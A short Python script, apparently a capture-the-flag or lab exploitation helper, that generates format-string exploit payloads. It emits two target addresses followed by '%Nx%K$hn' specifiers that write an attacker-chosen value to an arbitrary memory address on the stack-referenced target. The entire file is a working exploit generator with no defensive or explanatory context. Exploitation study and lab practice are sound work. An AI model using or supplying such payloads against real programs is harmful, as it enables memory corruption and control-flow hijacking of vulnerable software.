#!/usr/bin/env python3

import sys

def help():
    print("Usage: ./{} {{memory address}} {{value to write}} {{offset}}".format(sys.argv[0]))
    print("Address and value format: 0xXXXXXXXX")
    print("Offset - number of octets from $esp to start of buffer")
    exit(1)

def get_address(address):
    return address.to_bytes(4, 'little')

if len(sys.argv) < 4:
    help()

address = int(sys.argv[1], 16)
value = int(sys.argv[2], 16)
offset = int(sys.argv[3])

for i in range(2):
    sys.stdout.buffer.write(get_address(address + 2 * i))

total = 4 * 2
output = ''

for i in range(2):
    tmp = (value >> (i * 16)) & 0xffff
    tmp -= total
    while(tmp < 8):
        tmp += 0x10000
    output += '%' + str(tmp) + 'x%' + str(offset + i + 1) + '$hn'
    total += tmp

print(output, end='')
